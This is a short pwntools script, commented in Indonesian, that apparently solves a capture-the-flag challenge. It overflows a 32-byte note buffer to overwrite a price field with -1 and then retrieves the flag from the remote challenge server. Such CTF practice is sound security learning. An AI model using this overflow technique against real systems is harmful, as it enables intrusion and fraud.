from pwn import *

# Target server (menggunakan SSL sesuai perintah ncat di deskripsi)
host = 'boiled-strawberry-marinated-in-whipped-carbonara-feyg.gpn24.ctf.kitctf.de'
port = 443

p = remote(host, port, ssl=True)
# Jika ingin test lokal dulu, un-comment baris di bawah dan comment remote di atas:
# p = process('./challenge')

# Memilih menu nomor 1
p.sendlineafter(b'finish: ', b'1')

# Payload Buffer Overflow: 32 bytes padding untuk memenuhi 'note' + 4 bytes untuk menimpa 'price' menjadi -1
payload = b'A' * 32 + p32(0xffffffff)
p.sendlineafter(b'> ', payload)

# Kirim '0' untuk menyelesaikan pesanan dan memicu kalkulasi total
p.sendlineafter(b'finish: ', b'0')

# Menangkap sisa output (termasuk flag)
p.interactive()
